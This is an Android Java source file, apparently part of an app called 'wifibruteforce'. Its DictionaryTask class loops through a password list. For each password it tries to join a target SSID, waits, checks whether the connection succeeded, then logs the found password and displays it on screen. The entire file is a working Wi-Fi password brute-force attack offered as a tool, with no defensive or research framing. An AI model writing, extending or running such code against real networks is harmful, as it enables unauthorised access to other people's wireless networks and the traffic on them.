package com.nguyen.wifibruteforce;

import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.codekidlabs.storagechooser.StorageChooser;

import java.util.ArrayList;

import static android.content.Context.WIFI_SERVICE;

public class DictionaryTask extends AsyncTask<String, Integer, Integer> {
    private Activity activity;
    private String foundPass;
    private ArrayList<String> arrPass;

    public ArrayList<String> getArrPass() {
        return arrPass;
    }

    public void setArrPass(ArrayList<String> arrPass) {
        this.arrPass = arrPass;
    }

    public DictionaryTask(Activity activity) {
        this.activity = activity;

    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();

    }

    // strings[0]: ssid
    @Override
    protected Integer doInBackground(String... strings) {
        int count = 1;  //onProgressUpdate
        for (String testPass : getArrPass()) {
            Utils.finallyConnect(testPass, strings[0], activity);
            Log.d("running", testPass);

            publishProgress(count);     //onProgressUpdate

            if (isCancelled()) {
                Log.d("running", "isCancelled_DIC");
                break;
            }
            try {
                Thread.sleep(9000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
            assert cm != null;
            NetworkInfo ni = cm.getActiveNetworkInfo();
            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
                    && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
                Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
                foundPass = testPass;
//                Log.d("running", "pass for Toast: " + foundPass);
                break;
            }

            count += 1;
        }

        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        super.onProgressUpdate(values);
        TextView txtPassCount = activity.findViewById(R.id.txtPassCount);
        txtPassCount.setText(values[0] + "");
    }

    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);
        Toast.makeText(activity.getApplicationContext(), activity.getString(R.string.pass_found) + foundPass, Toast.LENGTH_LONG).show();
        activity.finish();
    }
}
